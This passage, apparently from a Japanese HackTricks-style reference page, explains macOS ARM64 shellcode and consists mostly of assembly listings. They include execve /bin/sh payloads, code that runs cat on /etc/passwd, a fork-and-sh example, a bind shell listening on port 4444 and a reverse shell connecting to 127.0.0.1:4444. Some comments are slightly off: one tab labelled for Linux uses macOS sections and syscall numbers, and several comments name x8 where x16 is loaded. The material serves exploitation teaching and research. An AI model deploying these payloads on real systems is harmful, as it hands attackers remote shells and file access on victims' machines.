[**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) から取得し、解説します。

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Read with cat

目的は `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` を実行することで、したがって第2引数 (x1) は params の配列で、メモリ上ではアドレスの stack になります。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### fork から sh でコマンドを実行し、メインプロセスが殺されないようにする
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell は [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) からのもので、**port 4444** で動作します。
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s) から revshell を **127.0.0.1:4444** に
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
